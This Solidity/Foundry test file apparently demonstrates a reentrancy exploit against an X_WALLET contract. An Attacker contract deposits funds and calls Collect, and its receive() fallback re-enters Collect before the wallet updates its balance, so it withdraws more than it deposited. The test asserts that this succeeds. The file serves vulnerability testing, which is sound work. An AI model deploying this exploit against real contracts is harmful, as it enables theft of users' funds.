
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {X_WALLET, Log} from "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {
    X_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new X_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Attacker locked deposit; unlock time in the past to satisfy Collect condition
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Ensure time passes unlockTime
        vm.warp(block.timestamp + 1000);

        // Start the attack
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;

    constructor(address victimAddress) {
        victim = X_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;

        // Deposit into the wallet so that Collect can be called later.
        // Use unlockTime = 0 so it gets set to current block.timestamp in Put.
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // Need to satisfy X_WALLET.Collect requirements:
        // balance >= MinSum and >= _am and block.timestamp > unlockTime
        // setupAttack deposited 'val' and test advanced time, so conditions hold.
        victim.Collect(val);

        // After reentrancy, balance should have increased by more than one Collect amount
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter before state update happens in Collect
            victim.Collect(storedVal);
        }
    }
}
